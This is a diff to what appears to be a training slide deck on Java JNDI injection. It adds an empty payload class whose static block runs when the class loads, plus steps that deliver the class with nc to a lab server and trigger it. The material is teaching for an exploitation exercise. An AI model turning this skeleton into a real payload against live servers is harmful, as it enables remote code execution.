@@ -638,15 +638,41 @@ sequenceDiagram
     </div>
 </section>
 
+<!-- ══════════ EXAMPLE: PAYLOAD SKELETON ══════════ -->
+<section>
+    <h2>Payload Skeleton</h2>
+    <pre><code data-trim class="language-java">
+import javax.naming.*;
+import javax.naming.spi.*;
+import java.util.Hashtable;
+
+public class Payload implements ObjectFactory {
+    static {
+        // this runs the instant the class is loaded
+        // put your code here
+    }
+
+    @Override
+    public Object getObjectInstance(
+            Object obj, Name name,
+            Context ctx, Hashtable&lt;?,?&gt; env) {
+        return null;
+    }
+}
+    </code></pre>
+</section>
+
 <!-- ══════════ EXAMPLE: STEPS ══════════ -->
 <section>
     <h2>Your Turn</h2>
-    <p style="font-size:0.88em; margin-bottom:0.6em">
-        Write a Java class with a <code>static{}</code> block. Submit it. Exploit the server.
+    <p style="font-size:0.95em; margin-bottom:0.6em">
+        <span class="green bold">Goal:</span> print your name to the server logs.
+        Show off your new sploit!
     </p>
     <pre><code data-trim class="language-bash">
 # 1. submit your payload — stager compiles &amp; hosts it
-cat Payload.java | nc playground.javaman.net 34249
+#    (use -q 1 or -N so nc sends EOF after the pipe closes)
+cat Payload.java | nc -q 1 playground.javaman.net 34249
 
 # 2. send the returned string to the echo server
 nc playground.javaman.net 34598
